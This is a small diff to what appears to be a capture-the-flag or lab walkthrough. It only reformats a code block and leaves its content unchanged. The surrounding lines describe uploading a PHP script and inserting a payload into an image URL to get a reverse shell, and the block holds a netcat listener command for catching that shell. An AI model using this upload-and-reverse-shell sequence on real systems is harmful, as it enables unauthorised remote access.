@@ -80,7 +80,9 @@ With our php script uploaded, we need to set up a reverse shell, which is done l
 
 Open the bash console and type
 
-```nc -nlvp [YOUR_PORT]```
+```
+nc -nlvp [YOUR_PORT]
+```
 
 Then, in the url of the image (*which can be copy+pasted from the page source*), we insert this payload to get a reverse shell    
 
